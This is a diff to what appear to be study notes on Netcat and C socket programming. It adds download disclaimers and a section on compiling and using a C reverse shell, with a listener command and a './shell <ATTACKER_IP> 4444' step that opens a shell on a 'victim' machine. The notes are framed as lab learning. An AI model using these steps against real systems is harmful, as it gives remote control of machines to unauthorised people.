@@ -51,12 +51,14 @@ Netcat (often abbreviated as `nc`) is a powerful network tool used for reading f
 
 #### Option 1: Using Nmap's Ncat
 1. Download and install Nmap from https://nmap.org/download.html.
+> **⚠️ Disclaimer:** Always verify the authenticity and integrity of files downloaded from external sources. Downloading and running binaries from the internet can pose security risks. Only use trusted sites and scan files for malware before execution.
 
 2. Use Ncat (a Netcat-compatible tool) from the command line:
    ```powershell
    ncat.exe -l -p 4444
    
 ### Option 2: Standalone Netcat Binary
+> **⚠️ Disclaimer:** Always verify the authenticity and integrity of files downloaded from external sources. Downloading and running binaries from the internet can pose security risks. Only use trusted sites and scan files for malware before execution.
 1. Download from a trusted source like https://eternallybored.org/misc/netcat/
 2. Extract and run from Command Prompt:
    ```cmd
@@ -173,3 +175,36 @@ Sends connection request to Socket and connects if open (returns 0); fails other
 
 
 https://www.geeksforgeeks.org/socket-programming-cc/
+
+## C reverse shell
+### how to compile, run and use the shell.c file for reverse shell
+ > ⚠️ For educational/lab use only. Only test on your own machines or safe environments like TryHackMe or HackTheBox.
+1. Compile the Code
+On Linux:
+    ```bash
+       gcc -o shell shell.c
+    ``` 
+2. Set Up the Listener on Attacker Machine
+On a separate machine or terminal, run:
+
+    ```bash
+    nc -lvnp 4444
+    ```
+Replace 4444 with your chosen port
+
+3. Run the Reverse Shell on Victim (or your test machine)
+    ```bash
+    ./shell <ATTACKER_IP> 4444
+    ```
+    Example:
+    ```bash
+    ./shell 192.168.1.10 4444
+    ```
+    If successful, your listener terminal gets a shell:
+
+    ```bash
+    whoami
+    pwd
+    ```
+
+
